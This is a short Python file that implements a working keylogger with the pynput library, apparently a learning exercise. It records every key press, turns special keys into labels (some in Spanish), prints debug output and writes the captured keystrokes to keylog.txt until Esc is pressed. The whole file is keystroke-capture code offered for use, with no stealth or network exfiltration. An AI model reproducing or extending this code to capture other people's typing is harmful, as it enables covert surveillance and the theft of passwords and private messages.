# importing the required modules
from pynput.keyboard import Key
from pynput.keyboard import Listener

# creating an empty list to store pressed keyss
the_keys = []


# special keys filter
def keyFilter(key):
    print("A keyfilter arriba" + str(key))
    match key:
        case Key.shift:
            key = "[SHIFTL]"
            print("Key val: " + key)
        case Key.shift_r:
            key = "[SHIFTR]"
            print("Key val: " + key)
        case Key.enter:
            key = "[ENTER]\n"
            print("Key val: " + key)
        case Key.backspace:
            key = "[DEL]"
            print("Key val: " + key)
        case Key.space:
            key = "[SPACEBAR]"
            print("Key val: " + key)
        case Key.tab:
            key = "[TAB]\t"
            print("Key val: " + key)
        case Key.caps_lock:
            key = "[MAYUS]"
            print("Key val: " + key)
        case Key.ctrl_l:
            key = "[CONTROLL]"
            print("Key val: " + key)
        case Key.ctrl_r:
            key = "[CONTROLR]"
            print("Key val: " + key)
        case Key.cmd:
            key = "[WINDOWS]"
            print("Key val: " + key)
        case Key.alt_l:
            key = "[ALTL]"
            print("Key val: " + key)
        case Key.alt_r:
            key = "[ALTR]"
            print("Key val: " + key)
        case Key.alt_gr:
            key = "[ALTGR]"
            print("Key val: " + key)
        case Key.left:
            key = "[LEFT]"
            print("Key val: " + key)
        case Key.up:
            key = "[UP]"
            print("Key val: " + key)
        case Key.down:
            key = "[DOWN]"
            print("Key val: " + key)
        case Key.right:
            key = "[RIGHT]"
            print("Key val: " + key)
        case Key.esc:
            key = "[ESC]"
            print("Key val: " + key)
        case Key.print_screen:
            key = "[IMPR PA]"
            print("Key val: " + key)
        case Key.delete:
            key = "[SUPR]"
            print("Key val: " + key)
        case Key.home:
            key = "[HOME]"
            print("Key val: " + key)
        case Key.page_down:
            key = "[AVPAG]"
            print("Key val: " + key)
        case Key.page_up:
            key = "[REPAG]"
            print("Key val: " + key)
        case Key.num_lock:
            key = "[NUMLOCK]"
            print("Key val: " + key)
        case Key.insert:
            key = "[INSERT]"
            print("Key val: " + key)
        case Key.end:
            key = "[END]"
            print("Key val: " + key)



    return key


# creating a function that defines what to do on each key press
def functionPerKey(key):
    # appending each pressed key to a list

    the_keys.append(keyFilter(key))
    print("Tecla presionada: " + str(the_keys[-1]))
    # writing list to file after each key pressed
    storeKeysToFile(the_keys)


# defining the function to write keys to the log file
def storeKeysToFile(keys):
    # creating the keylog.txt file with write mode
    with open('keylog.txt', 'w') as log:
        # looping through each key present in the list of keys
        for the_key in keys:
            # converting the key to string and removing the quotation marks
            the_key = str(the_key).replace("'", "")
            # writing each key to the keylog.txt file
            log.write(the_key)

        # defining the function to perform operation on each key release


def onEachKeyRelease(the_key):
    # In case, the key is "Esc" then stopping the keylogger
    if the_key == Key.esc:
        return False


with Listener(
        on_press=functionPerKey,
        on_release=onEachKeyRelease
) as the_listener:
    the_listener.join()
